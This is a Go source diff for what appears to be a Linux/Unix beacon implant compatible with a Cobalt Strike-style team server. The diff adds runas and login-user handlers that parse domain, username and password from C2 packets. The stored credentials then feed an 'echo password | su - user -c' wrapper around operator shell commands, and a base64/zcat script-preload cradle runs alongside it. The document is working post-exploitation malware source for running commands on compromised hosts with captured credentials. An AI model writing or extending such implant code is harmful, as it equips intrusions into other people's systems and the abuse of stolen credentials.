@@ -39,15 +39,16 @@ const (
 	CMD_TYPE_SOCKS_DIE				= 16	// TBD
 	CMD_TYPE_PIPE_FWD				= 22 	// IMPLEMENTED, is it, tho? Returned after forwarding linked beacon traffic to team server. Should be (target int, data []byte)
 	CMD_TYPE_GETUID		  			= 27	// IMPLEMENTED
+	CMD_TYPE_REVTOSELF				= 28	// IMPLEMENTED
 	CMD_TYPE_LIST_PROCESS 			= 32	// IMPLEMENTED
-	CMD_TYPE_PWSH_IMPORT			= 37  // IMPLEMENTED
-	CMD_TYPE_RUNAS					= 38	// TODO
+	CMD_TYPE_PWSH_IMPORT			= 37  	// IMPLEMENTED
+	CMD_TYPE_RUNAS					= 38	// IMPLEMENTED
 	CMD_TYPE_PWD          			= 39	// IMPLEMENTED
 	CMD_TYPE_JOB_KILL				= 42	// TODO: requires job control to be implemented
 	CMD_TYPE_DLL_INJECT_64			= 43	// WONTFIX: DLL injection is not an option for non-windows clients. Maybe shared library objects might be an alternative?
 	CMD_TYPE_SPAWN_64				= 44	// TODO
 	CMD_TYPE_IP_CONFIG	  			= 48	// TODO
-	CMD_TYPE_LOGIN_USER				= 49	// WONTFIX: ticket forging is not a thing in UNIX afaik
+	CMD_TYPE_LOGIN_USER				= 49	// IMPLEMENTED: Use as password setter function 	
 	CMD_TYPE_PORT_FWD				= 50 	// TODO
 	CMD_TYPE_PORT_FWD_STOP			= 51	// TODO
 	CMD_TYPE_FILE_BROWSE  			= 53	// IMPLEMENTED
@@ -174,6 +175,20 @@ func Shell(path string, args []byte) []byte {
 		}
 		args = bytes.ReplaceAll(args, []byte("/C"), []byte("-c"))
 	}
+	if config.StoredCredentials != nil {
+		// take the command, but prepend it with a su command to run as a another user
+		// echo '123456' | su - dummyuser -c "pwd; ls -al"
+
+
+	}
+	var cmd *exec.Cmd
+	var cradle string
+	if config.StoredCredentials != nil {
+		// take the command, but prepend it with a su command to run as a another user
+		// echo '123456' | su - dummyuser -c "pwd; ls -al"
+		
+		cradle = fmt.Sprintf("echo '%s' | su - %s -c \"$$CMD$$\"", config.StoredCredentials.Password, config.StoredCredentials.Username)
+	}
 	if strings.HasPrefix(fmt.Sprintf("%s", args), "powershell") {
 		startPos := bytes.Index(args, []byte("powershell -nop -exec bypass -EncodedCommand "))
 		args = args[startPos+45:]
@@ -191,12 +206,23 @@ func Shell(path string, args []byte) []byte {
 			pwshCmd = string([]byte(pwshCmd)[cradleStartPos+4:])
 			pwshCmd = strings.ReplaceAll(pwshCmd, "'", "\\'")
 			pwshCmd = fmt.Sprintf("source <(echo '%s' | base64 -di | zcat) ; %s", config.ShellPreLoadedFile, pwshCmd)
-			argsArray = []string{"-c", pwshCmd}
+			if cradle != "" {
+				argsArray = []string{"-c", strings.ReplaceAll(cradle, "$$CMD$$", pwshCmd)}
+			} else {
+				argsArray = []string{"-c", pwshCmd}
+			}
+			fmt.Printf("[ %x ]", argsArray)
+			cmd = exec.Command(path, argsArray...)
 		} else {
-			argsArray = []string{"-c", pwshCmd}
+			if cradle != "" {
+				argsArray = []string{"-c", strings.ReplaceAll(cradle, "$$CMD$$", pwshCmd)}
+			} else {
+				argsArray = []string{"-c", pwshCmd}
+			}
+
+			fmt.Printf("[ %x ]", argsArray)
+			cmd = exec.Command(path, argsArray...)
 		}
-		fmt.Printf("[ %x ]", argsArray)
-		cmd := exec.Command(path, argsArray...)
 		fmt.Printf("Executing '%s' with parameters '%s'\n", path, argsArray)
 		fmt.Printf("Executing '%s'\n", cmd)
 		out, err := cmd.CombinedOutput()
@@ -206,11 +232,15 @@ func Shell(path string, args []byte) []byte {
 		fmt.Printf("OUTPUT: %s\nERR: %s\n", out, err)
 		return out
 	} else {
-		startPos := bytes.Index(args, []byte("-c"))
-		args = args[startPos+3:]
-		argsArray = []string{"-c", string(args)}
+		// startPos := bytes.Index(args, []byte("-c"))
+		// args = args[startPos+3:]
+		if cradle != "" {
+			argsArray = []string{"-c", strings.ReplaceAll(cradle, "$$CMD$$", string(args))}
+		} else {
+			argsArray = []string{"-c", string(args)}
+		}
 		fmt.Printf("[ %x ]", argsArray)
-		cmd := exec.Command(path, argsArray...)
+		cmd = exec.Command(path, argsArray...)
 		fmt.Printf("Executing '%s' with parameters '%s'\n", path, argsArray)
 		fmt.Printf("Executing '%s'\n", cmd)
 		out, err := cmd.CombinedOutput()
@@ -220,7 +250,84 @@ func Shell(path string, args []byte) []byte {
 		fmt.Printf("OUTPUT: %s\nERR: %s\n", out, err)
 		return out
 	}
+}
 
+func ParseRunAs(b []byte) []byte {
+	// packet is build up: [length of domain (4 bytes)][domain][length of username (4 bytes)][username][length of password (4 bytes)][password][length of command (4 bytes)][command]
+	buf := bytes.NewBuffer(b)
+
+	domainLengthBuf := make([]byte, 4)
+	_, err := buf.Read(domainLengthBuf)
+	if err != nil {
+		processErrorTest(0, 0, 0, err.Error())
+		return nil
+	} 
+	domainLength := ReadInt(domainLengthBuf)
+	domainBuf := make([]byte, domainLength)
+	_, err = buf.Read(domainBuf)
+	if err != nil {
+		processErrorTest(0, 0, 0, err.Error())
+		return nil
+	} 
+	domain := string(domainBuf)
+
+	usernameLengthBuf := make([]byte, 4)
+	_, err = buf.Read(usernameLengthBuf)
+	if err != nil {
+		processErrorTest(0, 0, 0, err.Error())
+		return nil
+	} 
+	usernameLength := ReadInt(usernameLengthBuf)
+	usernameBuf := make([]byte, usernameLength)
+	_, err = buf.Read(usernameBuf)
+	if err != nil {
+		processErrorTest(0, 0, 0, err.Error())
+		return nil
+	} 
+	username := string(usernameBuf)
+
+	passwordLengthBuf := make([]byte, 4)
+	_, err = buf.Read(passwordLengthBuf)
+	if err != nil {
+		processErrorTest(0, 0, 0, err.Error())
+		return nil
+	} 
+	passwordLength := ReadInt(passwordLengthBuf)
+	passwordBuf := make([]byte, passwordLength)
+	_, err = buf.Read(passwordBuf)
+	if err != nil {
+		processErrorTest(0, 0, 0, err.Error())
+		return nil
+	} 
+	password := string(passwordBuf)
+
+	commandLengthBuf := make([]byte, 4)
+	_, err = buf.Read(commandLengthBuf)
+	if err != nil {
+		processErrorTest(0, 0, 0, err.Error())
+		return nil
+	} 
+	commandLength := ReadInt(commandLengthBuf)
+	commandBuf := make([]byte, commandLength)
+	_, err = buf.Read(commandBuf)
+	if err != nil {
+		processErrorTest(0, 0, 0, err.Error())
+		return nil
+	} 
+	command := string(commandBuf)
+
+	// store old StoredCredentials temporarily, set them to the one's we received, and restore after we are done
+	tempStoredCredentials := config.StoredCredentials
+	
+	fmt.Printf("Setting credentials for user \"%s\\%s:%s\"", domain, username, password)
+	config.StoredCredentials = &config.StoredCredential{domain, username, password}
+
+	// we will overwrite the path variable either way, so let's set it to an empty string
+	resultBuf := Shell("", []byte(command))
+
+	// restore stored credentials
+	config.StoredCredentials = tempStoredCredentials
+	return resultBuf
 }
 
 func ParseCommandUpload(b []byte) ([]byte, []byte) {
@@ -648,6 +755,60 @@ func ParseSocksDie(b []byte) []byte {
 		}
 	}
 	return nil
+}
+
+func ParseLoginUser(b []byte) bool {
+	// packet is build up: [length of domain (4 bytes)][domain][length of username (4 bytes)][username][length of password (4 bytes)][password] 
+	buf := bytes.NewBuffer(b)
+
+	domainLengthBuf := make([]byte, 4)
+	_, err := buf.Read(domainLengthBuf)
+	if err != nil {
+		processErrorTest(0, 0, 0, err.Error())
+		return false
+	} 
+	domainLength := ReadInt(domainLengthBuf)
+	domainBuf := make([]byte, domainLength)
+	_, err = buf.Read(domainBuf)
+	if err != nil {
+		processErrorTest(0, 0, 0, err.Error())
+		return false
+	} 
+	domain := string(domainBuf)
+
+	usernameLengthBuf := make([]byte, 4)
+	_, err = buf.Read(usernameLengthBuf)
+	if err != nil {
+		processErrorTest(0, 0, 0, err.Error())
+		return false
+	} 
+	usernameLength := ReadInt(usernameLengthBuf)
+	usernameBuf := make([]byte, usernameLength)
+	_, err = buf.Read(usernameBuf)
+	if err != nil {
+		processErrorTest(0, 0, 0, err.Error())
+		return false
+	} 
+	username := string(usernameBuf)
+
+	passwordLengthBuf := make([]byte, 4)
+	_, err = buf.Read(passwordLengthBuf)
+	if err != nil {
+		processErrorTest(0, 0, 0, err.Error())
+		return false
+	} 
+	passwordLength := ReadInt(passwordLengthBuf)
+	passwordBuf := make([]byte, passwordLength)
+	_, err = buf.Read(passwordBuf)
+	if err != nil {
+		processErrorTest(0, 0, 0, err.Error())
+		return false
+	} 
+	password := string(passwordBuf)
+
+	fmt.Printf("Setting credentials for user \"%s\\%s:%s\"", domain, username, password)
+	config.StoredCredentials = &config.StoredCredential{domain, username, password}
+	return true
 }
 
 func File_Browse(b []byte) []byte {
